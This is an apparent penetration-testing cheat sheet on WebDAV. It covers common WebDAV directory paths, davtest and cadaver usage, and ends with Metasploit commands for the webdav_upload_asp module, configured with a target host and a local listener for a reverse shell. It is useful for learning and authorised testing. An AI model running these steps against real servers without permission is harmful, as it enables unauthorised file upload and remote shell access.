**WebDAV** (Web Distributed Authoring and Versioning) is an extension of HTTP that allows users to collaboratively edit and manage files on web servers. It supports file creation, deletion, and modification directly over the web, making it useful for remote content management and file sharing. 

## Identification

WebDAV functionality is often configured in specific directories on a web server. Some common locations include:

- `/webdav/`
- `/dav/`
- `/files/`
- `/shared/`
- Root directory (`/`), depending on the server configuration.

## Davtest
**Davtest** is a tool for testing WebDAV servers. It checks for writable directories and uploads test files to evaluate potential exploitation options.

```bash
davtest -url <target_URL>
```

If the WebDAV server requires authentication, provide credentials using the `-auth` flag:

```bash
davtest -url http://example.com/webdav/ -auth <user>:<password>
```



## Cadaver
**Cadaver** is a command-line WebDAV client used to interact with WebDAV-enabled servers. It allows you to upload, download, manage, and delete files on a WebDAV server.

```bash
cadaver <URL>
```

#### Commands
Once access is gained with cadaver, commands such as the following can be executed.

| **Command**         | **Description**                                        |
| ------------------- | ------------------------------------------------------ |
| `ls`                | List files and directories on the server.              |
| `cd <directory>`    | Change to a different directory on the server.         |
| `pwd`               | Show the current directory on the server.              |
| `get <file>`        | Download a file from the server to your local machine. |
| `put <file>`        | Upload a file from your local machine to the server.   |
| `rm <file>`         | Delete a file on the server.                           |
| `mkdir <dir>`       | Create a new directory on the server.                  |
| `rmdir <dir>`       | Remove a directory on the server.                      |
| `mv <src> <dest>`   | Move or rename a file/directory.                       |
| `copy <src> <dest>` | Copy a file or directory on the server.                |
| `help`              | Show a list of commands and their descriptions.        |
| `quit`              | Exit the cadaver client.                               |


## Exploitation using Metasploit

1. **Set Up the Exploit Module**

```bash
use exploit/windows/http/webdav_upload_asp
```

2. **Configure the Exploit Options**

```bash
set RHOST <target_ip>
set RPORT 80
set TARGETURI /webdav/
set LHOST <your_local_ip>
set LPORT 4444
```

3. **Execute the Exploit**

```bash
exploit
```
